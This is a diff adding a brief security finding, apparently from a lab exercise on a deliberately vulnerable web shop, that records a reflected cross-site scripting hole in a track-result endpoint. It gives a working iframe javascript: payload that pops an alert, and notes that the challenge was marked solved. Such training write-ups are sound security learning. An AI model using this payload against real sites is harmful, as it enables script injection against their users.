@@ -1,0 +1,10 @@
+Finding: JUICE-003
+Vulnerability: Reflected Cross-Site Scripting
+Endpoint: /#/track-result?id=
+
+Payload:
+<iframe src="javascript:alert(`xss`)">
+
+Observed Result:
+Browser executed JavaScript and displayed an alert saying xss.
+The Reflected XSS challenge was marked solved.
